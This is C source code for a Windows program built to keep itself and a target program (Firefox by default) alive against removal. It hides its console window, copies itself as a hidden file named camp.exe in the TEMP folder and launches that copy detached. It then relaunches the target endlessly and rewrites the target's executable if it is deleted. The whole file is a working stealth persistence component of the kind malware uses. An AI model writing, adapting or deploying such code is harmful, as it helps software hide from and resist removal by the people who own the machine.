#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>

size_t str_len(char *string)
{
    size_t length = 0;
    while (*string != '\0')
    {
        length++;
        string++;
    }
    return length;
}
char* append(char *string, char *value)
{
    size_t len_string = str_len(string) + 1;
    size_t len_value = str_len(value) + 1;


    char* result = (char *) malloc((len_string + len_value - 1) * sizeof(char));
    if(result == NULL)
    {
        free(result);
        return NULL;
    }

    int i = 0;

    while(i < len_string - 1)
    {
        *result = string[i];
        result++;
        i++;
    }
    i = 0;
    while(i < len_value)
    {
        *result = value[i];
        result++;
        i++;
    }

    return result - (len_string + len_value - 1);
}
size_t read_file(char *path, char **buffer)
{
    FILE *fptr;

    fptr = fopen(path, "rb");
    if(fptr != NULL)
    {
        //Initialize Variables
        size_t size;

        //Go to the end of the file
        fseek(fptr, 0, SEEK_END);

        //Tell the size from the file
        size = ftell(fptr);

        //Go to the beginning of the file
        rewind(fptr);

        //Allocate memory for the buffer
        *buffer = (char *) malloc(size * sizeof(char));

        //Read the file into the buffer
        fread(*buffer, sizeof(char), size, fptr);

        //Close the file
        fclose(fptr);

        //return size of buffer;
        return size;
    }
    return 0;
}
void write_file(char *path, char *buffer, size_t size)
{
    if(buffer != NULL)
    {
        FILE *fptr;
        fptr = fopen(path, "wb");
        if(fptr != NULL)
        {
            fwrite(buffer, sizeof(char), size, fptr);
            fclose(fptr);
        }
        SetFileAttributesA((LPCSTR) path, 2);
    }
}
int process_active(char* name)
{
    int exists = 0;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE list = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(list, &entry))
    {
        do
        {
            if (!_strcmpi(entry.szExeFile, name))
            {
                exists = 1;
                break;
            }
        } while (Process32Next(list, &entry));
    }
    CloseHandle(list);
    return exists;
}
void get_real_path(char *path, char **buffer)
{
    *buffer = (char *) malloc(MAX_PATH * sizeof(char));
    GetFullPathNameA((LPCSTR) path, MAX_PATH, *buffer, NULL);
}
int start_process(char *name, char *environment)
{
    int passed;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    passed = CreateProcess(
            NULL,   // No module name (use command line)
            name,        // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            DETACHED_PROCESS,// creation flags
            NULL,           // Use parent's environment block
            environment,           // Use parent's starting directory
            &si,            // Pointer to STARTUPINFO structure
            &pi);           // Pointer to PROCESS_INFORMATION structure

    printf("passed: %d\n", passed);
    return passed;
}
void self_persist(char *path)
{
    char *buffer;
    char *real_path;
    char *full_temp_directory_path;
    char *temp_directory_path;
    size_t size;

    size = read_file(path, &buffer);

    if(size > 0)
    {
        _dupenv_s(&temp_directory_path, NULL, "TEMP");
        full_temp_directory_path = append(temp_directory_path, "\\camp.exe");
        write_file(full_temp_directory_path, buffer, size);
        get_real_path(path, &real_path);
        full_temp_directory_path = append(full_temp_directory_path, " ");
        full_temp_directory_path = append(full_temp_directory_path, real_path);
        start_process(full_temp_directory_path, temp_directory_path);
    }

}
void set_environment_and_name(char *path, char **environment, char **name)
{
    char *drive = (char *) malloc(_MAX_DRIVE);
    char *dir = (char *) malloc(_MAX_DIR);
    char *file_name = (char *) malloc(_MAX_FNAME);
    char *extension = (char *) malloc(_MAX_EXT);
    _splitpath(path, drive, dir, file_name, extension);
    *environment =  append(drive, dir);
    *name = append(file_name, extension);
}
int check_file(char *path)
{
    FILE *fptr;
    fptr = fopen(path, "r");
    if(fptr == NULL)
    {
        return 0;
    }
    fclose(fptr);
    return 1;
}

int main(int argc, char *argv[])
{

    HANDLE hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    char *buff;
    char *path;

    if(argc > 1)
    {
        path = argv[1];
    }
    else
    {
        path = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
        self_persist(argv[0]);
    }
    size_t a = read_file(path, &buff);
    if(a != 0)
    {
        char *environment = NULL;
        char *complete_file_name = NULL;
        set_environment_and_name(path, &environment, &complete_file_name);

        while (1)
        {
            if (!process_active(complete_file_name))
            {
                while (start_process(path, environment) == 0)
                {
                    if (check_file(path) == 0)
                    {
                        Sleep(5000);
                        write_file(path, buff, a);
                    }
                Sleep(500);
                }
            }
        Sleep(1000);
        }
    }
    return 0;
}

//Problem wenn Persister von Persister Persister restartet
//gibts nen zweiten persister

